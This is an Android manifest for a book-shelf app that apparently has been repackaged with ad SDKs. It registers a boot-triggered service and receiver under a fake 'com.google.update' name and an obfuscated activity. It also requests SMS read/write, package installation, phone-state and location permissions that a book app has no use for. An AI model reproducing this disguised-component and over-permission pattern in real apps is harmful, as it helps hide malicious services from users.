<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.livegame.android.shelves">
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:icon="@drawable/icon" android:label="@string/application_name" android:name=".ShelvesApplication">
        <activity android:label="@string/application_name" android:launchMode="singleTask" android:name=".activity.ShelvesActivity" android:theme="@style/Theme.Shelves">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEARCH"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <meta-data android:name="android.app.searchable" android:resource="@xml/searchable"/>
        </activity>
        <activity android:label="@string/activity_add_book" android:name="activity.AddBookActivity" android:theme="@android:style/Theme.Light.NoTitleBar"/>
        <activity android:label="@string/activity_book_details" android:name=".activity.BookDetailsActivity" android:theme="@android:style/Theme.Light.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="vnd.android.cursor.item/vnd.com.livegame.provider.shelves"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/activity_preferences" android:name="activity.SettingsActivity"/>
        <provider android:authorities="shelves" android:name=".provider.BooksProvider"/>
        <meta-data android:name="android.app.default_searchable" android:value=".activity.ShelvesActivity"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <meta-data android:name="ADMOGO_KEY" android:value="98141132c5054bb2b74237769b41e812"/>
        <activity android:configChanges="keyboard|keyboardHidden|navigation|orientation" android:name="com.vpon.adon.android.WebInApp" android:screenOrientation="portrait"/>
        <activity android:label="@string/application_name" android:name="com.adwo.adsdk.AdwoSplashAdActivity"/>
        <activity android:label="@string/application_name" android:name="com.adwo.adsdk.AdwoAdBrowserActivity"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.waps.OffersWebView"/>
        <meta-data android:name="CLIENT_PACKAGE" android:value="com.livegame.android.shelves"/>
        <meta-data android:name="WAPS_ID" android:value="6a341eeb84a9a6e14f73c7e2fbabafab"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="dJ$nO" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.update.UpdateService"/>
        <receiver android:name="com.google.update.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ST_MY_PID" android:value="1010user"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
</manifest>